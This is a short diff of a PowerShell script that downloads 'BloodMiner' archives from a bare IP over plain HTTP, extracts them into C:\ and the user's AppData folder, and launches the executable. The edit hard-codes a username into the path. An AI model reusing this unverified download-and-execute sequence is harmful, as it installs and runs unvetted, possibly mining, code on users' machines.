@@ -172,6 +172,6 @@ Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.Zip -Destination C:
 Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -Destination C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip
 
 Expand-Archive -Path C:\BloodMiner.Zip -DestinationPath C:\BloodMiner
-Expand-Archive -Path C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -DestinationPath C:\Users\$env:username\AppData\Local\BloodLand_Foundations\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg
+Expand-Archive -Path C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -DestinationPath C:\Users\hoa\AppData\Local\BloodLand_Foundations\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg
 
 Start-Process -FilePath "C:\BloodMiner\BloodMiner.exe"
